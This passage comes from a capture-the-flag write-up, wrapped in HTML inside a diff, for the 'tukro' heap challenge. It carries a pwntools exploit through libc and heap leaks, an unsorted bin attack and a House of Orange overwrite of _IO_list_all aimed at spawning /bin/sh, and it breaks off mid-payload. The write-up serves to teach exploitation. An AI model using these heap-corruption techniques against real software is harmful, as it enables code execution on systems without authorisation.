+        <span class="o">*</span><span class="p">(</span><span class="n">v2</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">v3</span> <span class="o">+</span> <span class="mi">1</span><span class="p">);</span>
+        <span class="o">*</span><span class="p">(</span><span class="n">v2</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span> <span class="o">=</span> <span class="n">v4</span><span class="p">;</span>
+      <span class="p">}</span>
+      <span class="n">v5</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">unk_203060</span> <span class="o">+</span> <span class="mi">200</span> <span class="o">*</span> <span class="n">a1</span> <span class="o">+</span> <span class="mi">16</span> <span class="o">*</span> <span class="p">(</span><span class="o">--</span><span class="n">dword_203080</span><span class="p">[</span><span class="mi">50</span> <span class="o">*</span> <span class="n">a1</span><span class="p">]</span> <span class="o">+</span> <span class="mi">2LL</span><span class="p">);</span>
+      <span class="o">*</span><span class="p">(</span><span class="n">v5</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">=</span> <span class="n">v9</span><span class="p">;</span>
+      <span class="o">*</span><span class="p">(</span><span class="n">v5</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span> <span class="o">=</span> <span class="n">v10</span><span class="p">;</span>
+      <span class="n">free</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="o">&amp;</span><span class="n">unk_203068</span> <span class="o">+</span> <span class="mi">25</span> <span class="o">*</span> <span class="n">a1</span> <span class="o">+</span> <span class="mi">2</span> <span class="o">*</span> <span class="p">(</span><span class="n">dword_203080</span><span class="p">[</span><span class="mi">50</span> <span class="o">*</span> <span class="n">a1</span><span class="p">]</span> <span class="o">+</span> <span class="mi">2LL</span><span class="p">)));</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+  <span class="k">else</span>
+  <span class="p">{</span>
+    <span class="n">puts</span><span class="p">(</span><span class="s">"You don't have a testimonial yet"</span><span class="p">);</span>
+  <span class="p">}</span>
+</code></pre></div></div>
+
+<p>Hey wait , doesn’t this for loop look a little more fishy to you?</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="n">v8</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="n">dword_203080</span><span class="p">[</span><span class="mi">50</span> <span class="o">*</span> <span class="n">a1</span><span class="p">];</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
+
+</code></pre></div></div>
+
+<p>The iterations happen for <em>dword_203080[50 * a1] + 1</em> times. Let’s see how we can use this.</p>
+
+<p>We have the bugs , heading on to exploit this.</p>
+
+<h2 id="exploit-development-and-analysis">Exploit Development and Analysis</h2>
+
+<p>Getting leaks shouldn’t be a herculean task , so let’s go with it without further blabbering.</p>
+
+<p>First we allocate 3 users , sign in to first user and allocate 8 chunks into second user’s bss space.</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">"./libc.so.6"</span><span class="p">,</span><span class="n">checksec</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
+<span class="k">if</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">1</span><span class="p">):</span>
+    <span class="n">io</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s">'tukro.pwn2.win'</span><span class="p">,</span><span class="mi">1337</span><span class="p">)</span>
+    <span class="n">context</span><span class="p">.</span><span class="n">noptrace</span> <span class="o">=</span> <span class="bp">True</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./tukro"</span><span class="p">,</span><span class="n">env</span> <span class="o">=</span> <span class="p">{</span><span class="s">"LD_PRELOAD"</span> <span class="p">:</span> <span class="s">"./libc.so.6"</span><span class="p">})</span>
+
+<span class="k">def</span> <span class="nf">sign_up</span><span class="p">(</span><span class="n">user</span><span class="p">,</span><span class="n">passw</span><span class="p">):</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span><span class="s">"1"</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Username: "</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">user</span><span class="p">))</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Password: "</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">passw</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">sign_in</span><span class="p">(</span><span class="n">user</span><span class="p">,</span><span class="n">passw</span><span class="p">):</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span><span class="s">"2"</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Username: "</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">user</span><span class="p">))</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Password: "</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">passw</span><span class="p">))</span>
+
+
+<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">recp</span><span class="p">,</span><span class="n">test</span><span class="p">):</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span><span class="s">"1"</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Recipient Username: "</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">recp</span><span class="p">))</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Testimonial: "</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">test</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">my_test</span><span class="p">():</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span><span class="s">"2"</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">choice</span><span class="p">,</span><span class="n">number</span><span class="p">,</span><span class="n">data</span><span class="p">):</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span><span class="s">"3"</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Edit Testimonial (y/N): "</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">choice</span><span class="p">)</span>
+    <span class="k">if</span><span class="p">(</span><span class="n">choice</span> <span class="o">==</span> <span class="s">"y"</span><span class="p">):</span>
+        <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Testimonial Number: "</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">number</span><span class="p">))</span>
+        <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"New Testimonial: "</span><span class="p">,</span><span class="n">data</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">delete</span><span class="p">(</span><span class="n">number</span><span class="p">):</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span><span class="s">"4"</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Testimonial Number: "</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="n">number</span><span class="p">))</span>
+
+<span class="k">def</span> <span class="nf">sign_out</span><span class="p">():</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span><span class="s">"5"</span><span class="p">)</span>
+
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+    <span class="n">sign_up</span><span class="p">(</span><span class="s">"first_user"</span><span class="p">,</span><span class="s">"first_user"</span><span class="p">)</span>
+    <span class="n">sign_up</span><span class="p">(</span><span class="s">"second"</span><span class="p">,</span><span class="s">"second"</span><span class="p">)</span>
+    <span class="n">sign_up</span><span class="p">(</span><span class="s">"third"</span><span class="p">,</span><span class="s">"third"</span><span class="p">)</span>
+    <span class="n">sign_in</span><span class="p">(</span><span class="s">"first_user"</span><span class="p">,</span><span class="s">"first_user"</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
+        <span class="n">add</span><span class="p">(</span><span class="s">"second"</span><span class="p">,</span><span class="nb">str</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="s">'a'</span><span class="p">)</span> <span class="o">+</span> <span class="n">i</span><span class="p">))</span><span class="o">*</span><span class="mi">4</span><span class="p">)</span>
+    <span class="n">gdb</span><span class="p">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+
+</code></pre></div></div>
+
+<p>Now we <em>sign_in</em> from second user and delete first 3 chunks.</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">sign_out</span><span class="p">()</span>
+    <span class="n">sign_in</span><span class="p">(</span><span class="s">"second"</span><span class="p">,</span><span class="s">"second"</span><span class="p">)</span>
+    <span class="n">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="n">delete</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+    <span class="n">delete</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+    <span class="n">sign_out</span><span class="p">()</span>
+
+</code></pre></div></div>
+
+<p>Finally sign in from the first user and invoke the edit functionality which prints the contents of all testimonials of all users.</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">sign_in</span><span class="p">(</span><span class="s">"first_user"</span><span class="p">,</span><span class="s">"first_user"</span><span class="p">)</span>
+
+    <span class="c1">#Leaks
+</span>    <span class="n">leaks</span> <span class="o">=</span> <span class="n">edit</span><span class="p">(</span><span class="s">'N'</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="s">""</span><span class="p">)</span>
+    <span class="n">string1</span> <span class="o">=</span> <span class="n">leaks</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)[</span><span class="o">-</span><span class="mi">2</span><span class="p">]</span>
+    <span class="n">string2</span> <span class="o">=</span> <span class="n">leaks</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)[</span><span class="o">-</span><span class="mi">5</span><span class="p">]</span>
+    <span class="n">libc_base</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">string1</span> <span class="o">+</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="o">*</span><span class="mi">2</span><span class="p">)</span><span class="o">-</span> <span class="mh">0x3c4b78</span>
+    <span class="n">heap_base</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">string2</span><span class="o">+</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="o">*</span><span class="mi">2</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0xa20</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Libc, Heap @ "</span><span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">)</span> <span class="o">+</span> <span class="s">" : "</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">heap_base</span><span class="p">))</span>
+    <span class="n">gdb</span><span class="p">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">)</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+
+</code></pre></div></div>
+
+<p>Now that we have the necessary leaks , and we can edit free chunks , the first idea that came into light was <strong>Unsorted Bin Attack</strong> by overwriting <strong>global_max_fast</strong> pointer in libc bss to make large sizes appear as fastbin sizes to malloc.</p>
+
+<p>But there was an issue of size , it was fixed to 0x500 and for a successful attack with fastbin , we need to have this size somehow near a region like <strong>__malloc_hook</strong> or <strong>free_hook</strong> but we found none. We also tried with exit pointers in libc bss but with no luck.</p>
+
+<p>Hence the only idea that was left worth trying was overwriting the <strong>IO_list_all</strong> pointer to invoke <strong>House Of Orange</strong> attack.</p>
+
+<p>Let’s have a look at the procedure in which we can trigger <strong>HOO</strong>.</p>
+
+<ul>
+  <li>
+    <p>When malloc detects an error in the linked lists, like a corrupted fd and bk pointers, it aborts and calls a function <strong>_IO_flush_all_lockp</strong>.</p>
+  </li>
+  <li>
+    <p>This function is used to close all the file pointers such as stdout, stderr etc.</p>
+  </li>
+  <li>
+    <p>It does the same by using a global pointer called <strong>_IO_list_all</strong> that contains the pointer to the stdout/stderr file pointer.</p>
+  </li>
+  <li>
+    <p>The file pointer structures contain a pointer to the next file pointer. The function uses this to iteratively close all the file pointers used.</p>
+  </li>
+  <li>
+    <p>Now, these file pointers have jump tables that are used if some pre-conditions are met.</p>
+  </li>
+  <li>
+    <p>So, the idea is to overwrite the <strong>_IO_list_all</strong> pointer and point it to a location we control.</p>
+  </li>
+</ul>
+
+<p>We overwrite the <strong>\IO_list_all</strong> with a pointer to the main_arena.</p>
+
+<ul>
+  <li>
+    <p>By correctly setting the size of the chunk in the free list, we can make sure that the next file pointer accessed will be the chunk in the free list.</p>
+  </li>
+  <li>
+    <p>So, in order to overwrite the <strong>_IO_list_all</strong> with a pointer to the main_arena, we use the unlink vulnerability.</p>
+  </li>
+</ul>
+
+<p>When a chunk in the free list is to be splitted off to service a malloc request, the code that gets executed is as follows</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">unsorted_chunks</span> <span class="p">(</span><span class="n">av</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">bck</span><span class="p">;</span>
+<span class="n">bck</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">unsorted_chunks</span> <span class="p">(</span><span class="n">av</span><span class="p">);</span>
+
+</code></pre></div></div>
+
+<p>So, the fd pointer of previous chunk get’s overwritten with an address in the main_arena.</p>
+
+<p>If we set the previous chunk to be <strong>_IO_list_all – 0x10</strong>, then <strong>bck-&gt;fd</strong> will be the <strong>_IO_list_all</strong> pointer.</p>
+
+<p>In brief , all we need to do is</p>
+
+<ol>
+  <li>
+    <p>Corrupt bck pointer of free chunk to point to <strong>_IO_list_all – 0x10</strong>.</p>
+  </li>
+  <li>
+    <p>Set size of chunk such that the second file pointer accessed is under users control. (<strong>0x61</strong> is one such value)</p>
+  </li>
+</ol>
+
+<p>So now the problem is we dont have control over size of the chunk we allocate , and hence in this case , we need to create overlapping chunks in such a way that we get control over size , fd and bk of a free chunk.</p>
+
+<p>At this point , we have 3 chunks in free list , 2 of which are in unsorted bin.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0000| 0x564dac5fd150 <span class="nt">--</span><span class="o">&gt;</span> 0x564dacc41520 <span class="nt">--</span><span class="o">&gt;</span> 0xa62626262 <span class="o">(</span><span class="s1">'bbbb\n'</span><span class="o">)</span>
+0008| 0x564dac5fd158 <span class="nt">--</span><span class="o">&gt;</span> 0x1 
+0016| 0x564dac5fd160 <span class="nt">--</span><span class="o">&gt;</span> 0x564dacc41f40 <span class="nt">--</span><span class="o">&gt;</span> 0xa64646464 <span class="o">(</span><span class="s1">'dddd\n'</span><span class="o">)</span>
+0024| 0x564dac5fd168 <span class="nt">--</span><span class="o">&gt;</span> 0x1 
+0032| 0x564dac5fd170 <span class="nt">--</span><span class="o">&gt;</span> 0x564dacc42960 <span class="nt">--</span><span class="o">&gt;</span> 0xa66666666 <span class="o">(</span><span class="s1">'ffff\n'</span><span class="o">)</span>
+0040| 0x564dac5fd178 <span class="nt">--</span><span class="o">&gt;</span> 0x1 
+0048| 0x564dac5fd180 <span class="nt">--</span><span class="o">&gt;</span> 0x564dacc42e70 <span class="nt">--</span><span class="o">&gt;</span> 0xa67676767 <span class="o">(</span><span class="s1">'gggg\n'</span><span class="o">)</span>
+0056| 0x564dac5fd188 <span class="nt">--</span><span class="o">&gt;</span> 0x1 
+0064| 0x564dac5fd190 <span class="nt">--</span><span class="o">&gt;</span> 0x564dacc43380 <span class="nt">--</span><span class="o">&gt;</span> 0xa68686868 <span class="o">(</span><span class="s1">'hhhh\n'</span><span class="o">)</span>
+0072| 0x564dac5fd198 <span class="nt">--</span><span class="o">&gt;</span> 0x1 
+0080| 0x564dac5fd1a0 <span class="nt">--</span><span class="o">&gt;</span> 0x564dacc42450 <span class="nt">--</span><span class="o">&gt;</span> 0x564dacc41a20 <span class="nt">--</span><span class="o">&gt;</span> 0x0  -&gt; This is <span class="k">in </span>unsorted bin
+0088| 0x564dac5fd1a8 <span class="nt">--</span><span class="o">&gt;</span> 0x1 
+0096| 0x564dac5fd1b0 <span class="nt">--</span><span class="o">&gt;</span> 0x564dacc41a30 <span class="nt">--</span><span class="o">&gt;</span> 0x564dacc41000 <span class="nt">--</span><span class="o">&gt;</span> 0x0  -&gt; we edit this chunk<span class="s1">'s fd to our fake chunk
+0104| 0x564dac5fd1b8 --&gt; 0x1 
+0112| 0x564dac5fd1c0 --&gt; 0x564dacc41010 --&gt; 0x7f0e3ab4bb78 --&gt; 0x564dacc43880 --&gt; 0x0 -&gt; This is also in unsorted bin
+0120| 0x564dac5fd1c8 --&gt; 0x1 
+
+</span></code></pre></div></div>
+<p>Let’s script what we desire</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+    <span class="n">IO_list</span>  <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'_IO_list_all'</span><span class="p">]</span>
+    <span class="n">bk</span> <span class="o">=</span> <span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x1960</span>
+    <span class="n">fd</span> <span class="o">=</span> <span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x1440</span> <span class="o">-</span> <span class="mh">0x8</span>
+    <span class="n">edit</span><span class="p">(</span><span class="s">'y'</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="n">fd</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bk</span><span class="p">))</span>
+    <span class="n">gdb</span><span class="p">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">)</span>
+
+</code></pre></div></div>
+
+<p>And see how the chunks look like -&gt;</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0000| 0x561a4bb48150 <span class="nt">--</span><span class="o">&gt;</span> 0x561a4d2e4520 <span class="nt">--</span><span class="o">&gt;</span> 0xa62626262 <span class="o">(</span><span class="s1">'bbbb\n'</span><span class="o">)</span>
+0008| 0x561a4bb48158 <span class="nt">--</span><span class="o">&gt;</span> 0x1 
+0016| 0x561a4bb48160 <span class="nt">--</span><span class="o">&gt;</span> 0x561a4d2e4f40 <span class="nt">--</span><span class="o">&gt;</span> 0xa64646464 <span class="o">(</span><span class="s1">'dddd\n'</span><span class="o">)</span>
+0024| 0x561a4bb48168 <span class="nt">--</span><span class="o">&gt;</span> 0x1 
+0032| 0x561a4bb48170 <span class="nt">--</span><span class="o">&gt;</span> 0x561a4d2e5960 <span class="nt">--</span><span class="o">&gt;</span> 0xa66666666 <span class="o">(</span><span class="s1">'ffff\n'</span><span class="o">)</span>                   -&gt; This is chunk 3 , our supposed fake chunk
+0040| 0x561a4bb48178 <span class="nt">--</span><span class="o">&gt;</span> 0x1 
+0048| 0x561a4bb48180 <span class="nt">--</span><span class="o">&gt;</span> 0x561a4d2e5e70 <span class="nt">--</span><span class="o">&gt;</span> 0xa67676767 <span class="o">(</span><span class="s1">'gggg\n'</span><span class="o">)</span>
+0056| 0x561a4bb48188 <span class="nt">--</span><span class="o">&gt;</span> 0x1 
+0064| 0x561a4bb48190 <span class="nt">--</span><span class="o">&gt;</span> 0x561a4d2e6380 <span class="nt">--</span><span class="o">&gt;</span> 0xa68686868 <span class="o">(</span><span class="s1">'hhhh\n'</span><span class="o">)</span>
+0072| 0x561a4bb48198 <span class="nt">--</span><span class="o">&gt;</span> 0x1 
+0080| 0x561a4bb481a0 <span class="nt">--</span><span class="o">&gt;</span> 0x561a4d2e5450 <span class="nt">--</span><span class="o">&gt;</span> 0x561a4d2e4a20 <span class="nt">--</span><span class="o">&gt;</span> 0x0 
+0088| 0x561a4bb481a8 <span class="nt">--</span><span class="o">&gt;</span> 0x1 
+0096| 0x561a4bb481b0 <span class="nt">--</span><span class="o">&gt;</span> 0x561a4d2e4a30 <span class="nt">--</span><span class="o">&gt;</span> 0x561a4d2e5960 <span class="nt">--</span><span class="o">&gt;</span> 0xa66666666 <span class="o">(</span><span class="s1">'ffff\n'</span><span class="o">)</span> -&gt; Clean , we overwrote fd with chunk 3<span class="s1">'s addr
+0104| 0x561a4bb481b8 --&gt; 0x1 
+0112| 0x561a4bb481c0 --&gt; 0x561a4d2e4010 --&gt; 0x7fdc8f575b78 --&gt; 0x561a4d2e6880 --&gt; 0x0 
+
+</span></code></pre></div></div>
+
+<p>Now we edit chunk 3 and fake our chunk there.</p>
+
+<p>We create our fake chunk in our chunk 3 , so that we can overwrite the size of the next chunk.</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+    <span class="n">bk</span> <span class="o">=</span> <span class="n">IO_list</span> <span class="o">-</span> <span class="mh">0x10</span>
+    <span class="n">fd</span> <span class="o">=</span> <span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0xa20</span>
+    <span class="n">edit</span><span class="p">(</span><span class="s">'y'</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x511</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fd</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bk</span><span class="p">))</span>
+    <span class="n">gdb</span><span class="p">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">)</span>
+
+</code></pre></div></div>
+
+<p>Let’s see how chunk 3 looks like now.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+0x561a3e08d950:	0x0000000000000510	0x0000000000000510 
+0x561a3e08d960:	0x0000000000000000	0x0000000000000511 -&gt; Fake chunk header
+0x561a3e08d970:	0x0000561a3e08ca20	0x00007fc7d9e04510 -&gt; fd and bk <span class="nb">set </span>appropriately
+0x561a3e08d980:	0x000000000000000a	0x0000000000000000
+
+</code></pre></div></div>
+
+<p>Well , its time to trigger overwrite of <strong>IO_list_all</strong> pointer by mallocing 2 chunks.</p>
+
+<p>The third call to malloc should return our fake chunk.</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="c1">#Get stuff back from unsorted bin
+</span>    <span class="n">add</span><span class="p">(</span><span class="s">"third"</span><span class="p">,</span><span class="s">"aaaa"</span><span class="p">)</span>
+    <span class="n">add</span><span class="p">(</span><span class="s">"third"</span><span class="p">,</span><span class="s">"bbbb"</span><span class="p">)</span>
+    <span class="c1">#Finally get back our fake chunk and overwrite the size of the next chunk with 0x91
+</span>    <span class="n">payload</span> <span class="o">=</span> <span class="s">'f'</span><span class="o">*</span><span class="mi">8</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="mh">0x500</span><span class="o">-</span><span class="mh">0x8</span><span class="p">)</span><span class="o">/</span><span class="mi">8</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x91</span><span class="p">)</span>
+    <span class="n">add</span><span class="p">(</span><span class="s">"third"</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+
+</code></pre></div></div>
+
+<p>With this , we successfully faked the size of a valid chunk.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x555555759e60:	0x0000000000000000	0x0000000000000091
+0x555555759e70:	0x0000000a67676767	0x0000000000000001
+
+</code></pre></div></div>
+
+<p>Looks like our fake chunk is in second user’s area. We sign_out and sign_in back into second user.</p>
+
+<p>We free the 0x91 chunk now.</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="n">sign_out</span><span class="p">()</span>
+    <span class="n">sign_in</span><span class="p">(</span><span class="s">"second"</span><span class="p">,</span><span class="s">"second"</span><span class="p">)</span>
+    <span class="n">delete</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span> 
+
+</code></pre></div></div>
+
+<p>Cool , its a part of unsorted bin now.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+0x555555759e60:	0x0000000000000000	0x0000000000000091
+0x555555759e70:	0x00007ffff7dd1b78	0x00007ffff7dd1b78
+0x555555759e80:	0x0000000000000000	0x0000000000000000
+
+<span class="nv">$1</span> <span class="o">=</span> <span class="o">{</span>
+  mutex <span class="o">=</span> 0x0,
+  flags <span class="o">=</span> 0x1,
+  fastbinsY <span class="o">=</span> <span class="o">{</span>0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0<span class="o">}</span>,
+  top <span class="o">=</span> 0x55555575a880,
+  last_remainder <span class="o">=</span> 0x0,
+  bins <span class="o">=</span> <span class="o">{</span>0x555555759e60, 0x555555759e60,......<span class="o">}</span>
+
+</code></pre></div></div>
+
+<p>The aim is to get a 0x61 sized unsorted bin for easy IO_list_all overwrite.</p>
+
+<p>For that , we need to do some additional work , we sign back in to first user and edit the chunk above our fake chunk to make it’s size 0x61 this time.</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    
+    <span class="n">sign_out</span><span class="p">()</span>
+    <span class="n">sign_in</span><span class="p">(</span><span class="s">"first_user"</span><span class="p">,</span><span class="s">"first_user"</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="s">"llll"</span><span class="o">+</span><span class="s">"</span><span class="se">\x00</span><span class="s">"</span><span class="o">*</span><span class="mi">1260</span> <span class="o">+</span> <span class="s">"/bin/sh</span><span class="se">\x00</span><span class="s">"</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x61</span><span class="p">)</span>
+    <span class="n">edit</span><span class="p">(</span><span class="s">'y'</span><span class="p">,</span><span class="mi">11</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>  <span class="c1">#our fake chunk is first_user's 11th chunk 
+</span>
+</code></pre></div></div>
+
+<p>But how come we can access our fake chunk from 11th offset , there are only 10 testimonials per user right?</p>
+
+<p>The answer is that fishy for loop range we saw previously is helping us achieve this.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="n">v8</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="n">dword_555555757080</span><span class="p">[</span><span class="mi">50</span> <span class="o">*</span> <span class="n">a1</span><span class="p">];</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
+
+</code></pre></div></div>
+
+<p>Finally we edit our fake chunk with the file structure that satisfies the constraints of calling <strong>system(“/bin/sh”)</strong> from malloc abort.</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+    <span class="n">addr</span> <span class="o">=</span> <span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x1f30</span>
+    <span class="n">vtable</span> <span class="o">=</span> <span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x1f58</span>
+    <span class="n">system</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">]</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xdeadbeef</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">IO_list</span><span class="o">-</span> <span class="mh">0x10</span><span class="p">)</span>
